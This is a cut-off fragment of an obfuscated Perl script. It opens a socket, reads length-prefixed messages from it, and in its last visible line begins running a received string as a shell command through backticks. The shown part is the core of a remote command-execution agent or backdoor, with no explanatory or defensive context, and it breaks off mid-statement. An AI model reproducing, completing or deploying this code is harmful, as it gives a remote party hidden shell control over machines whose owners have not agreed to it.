#!/usr/bin/env perl

use strict;
use warnings;
use IO::Socket;
use IPC::Open2;

my$l;

sub G
{
	die if !defined 
	syswrite $l,$_[0]
}
	
sub J{
	my ($U, $A)=('','');
while($_[0]>length$U) {
	die if! sysread$l,$A,$_[0]-length$U;
$U.=$A;
}return$U;
} sub O{unpack'V',J 4}sub N{J O}sub H{my$U=N;
 $U=~s/\\/\//g;
$U}sub I{my$U=eval{my$C=`$_[0]`